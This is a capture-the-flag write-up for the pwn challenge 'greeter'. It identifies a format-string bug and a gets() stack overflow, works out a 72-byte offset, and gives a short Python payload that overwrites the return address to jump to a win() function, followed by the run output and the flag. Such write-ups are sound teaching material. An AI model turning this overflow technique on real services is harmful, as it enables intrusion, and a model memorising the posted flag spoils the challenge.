# greeter

**Category:** Pwn · **Points:** 170 · **Solves:** 74 · **Author:** vyx7

**Flag:** `LITCTF{y3t-4N0tH3r-gEn3r1C-f0rM4T-sTR1nG}`

## Challenge

> How's your day going?
>
> `nc 136.115.87.65 31780`

## Analysis

`main` calls `greet()` then `greet2()`:

```c
greet():   printf("whats your name? ");
           fgets(name, 0x40, stdin);      // name is a global, bounded
           printf(name);                  // <-- format-string bug (bounded)
greet2():  printf("hows your day? ");
           char buf[0x40];
           gets(buf);                     // <-- UNBOUNDED stack overflow
```

Two bugs. The flag text (`y3t-4N0tH3r-gEn3r1C-f0rM4T-sTR1nG` = "yet another generic
format string") points at the **`printf(name)`** format-string bug as the intended
route. But `greet2`'s **`gets(buf)`** is a plain stack overflow and is the simplest
kill, so that's what this solve uses.

`buf` is at `[rbp-0x40]`, and the binary is **non-PIE** with a `win()` at **`0x401236`**
that `fopen`s `flag.txt` and prints it. Overflow layout:

```
[ 0x40 bytes buf ][ 8 bytes saved rbp ][ return address ]
        64        +        8           =  72  -> then p64(win)
```

## Exploit

```python
payload = b"A"*72 + p64(0x401236)   # smash return address in greet2 -> win
# line 1 (greet name) can be anything; line 2 is the overflow
```

```bash
python solve.py
```

```
whats your name? nice to meet you, hi
hows your day? wonderful!
you won! heres your flag:
LITCTF{y3t-4N0tH3r-gEn3r1C-f0rM4T-sTR1nG}
```

No stack-alignment gadget was needed — a direct `ret` into `win` worked.

## Flag

```
LITCTF{y3t-4N0tH3r-gEn3r1C-f0rM4T-sTR1nG}
```
